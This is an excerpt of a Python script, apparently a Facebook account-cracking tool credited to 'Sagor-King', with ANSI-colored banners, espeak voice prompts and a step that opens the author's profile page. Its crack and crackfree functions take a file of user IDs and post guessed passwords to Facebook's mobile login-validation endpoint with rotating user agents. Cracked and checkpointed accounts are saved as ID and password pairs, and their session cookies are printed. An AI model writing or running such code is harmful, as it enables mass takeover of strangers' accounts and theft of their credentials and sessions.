...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mআইতাছি খাড়া...? ')
time.sleep(5)
os.system('clear')
os.system('espeak -a 300 " follow,        my,          Facebook,         ID,"')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m follow my Facebook id ")
time.sleep(10)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100068192857834')
#------------------[ Sagor-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Sagor ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Sagor King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mSagor-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01888752730 ]  ║\33[1;35m 
╠══[TOOLS                    • free ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " your,    name,      is,         very,       beautiful ,"')
animation('\033[97;1m[\033[92;1m•\033[97;1m]your name is very beautiful ')
time.sleep(5)
os.system('espeak -a 300 " Welcome,   to,  Sagoor,  King,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    os.system('espeak -a 300 " choose,.          your,.       manu,"')
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/sagor.txt  Etc...]')
    ...
    try:lin = open(o).read().splitlines()
        ...
        os.system('espeak -a 300 " please,            Try,              again,                     put,                              python,                                  sagor.py,"')
        animation(' [×] Please try again (python sagor.py)')
        time.sleep(20)
        back()
    for xid in lin:
        id.append(xid)
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Sagor•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Sagor-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Sagor-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Sagor,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Sagor-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Sagor-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Sagor-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Sagor,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
